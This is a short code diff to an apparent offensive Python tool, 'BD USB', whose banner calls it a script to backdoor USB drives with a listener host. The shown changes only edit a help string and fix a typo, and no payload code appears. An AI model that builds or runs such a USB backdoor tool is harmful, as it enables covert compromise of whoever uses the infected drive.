@@ -4,7 +4,7 @@ try:
         global args
         parser = argparse.ArgumentParser()
         parser.add_argument('-u', '--usb', help="USB To inject Backdoor to. USB Needs to be mounted!\nHow to mount USB: pmount /dev/sdc1")
-        parser.add_argument('-l', '--lhost', help="Listen HOST For the backdoor\nE.G.: 192.168.1.3")
+        parser.add_argument('-l', '--lhost', help="Listen HOST For the backdoor\nE.G.: 192.168.1.3\nNOTE: The Server file will be generated in the 'Un-Safe' directory.")
         args = parser.parse_args()
     def print_red(msg):
         print(bcolors.FAIL + msg + bcolors.ENDC)
@@ -38,7 +38,7 @@ try:
                                      
                                     
     """)
-	    print_blue("	    Welcome To BD USB! \n	    Best Python ScriptTo Backdoor USB's!\n	    Have Fun and stay Legal!")
+	    print_blue("	    Welcome To BD USB! \n	    Best Python Script To Backdoor USB's!\n	    Have Fun and stay Legal!")
 	    print_red("""
 	    Original Software made by NSK B3
 	    Youtube:""")
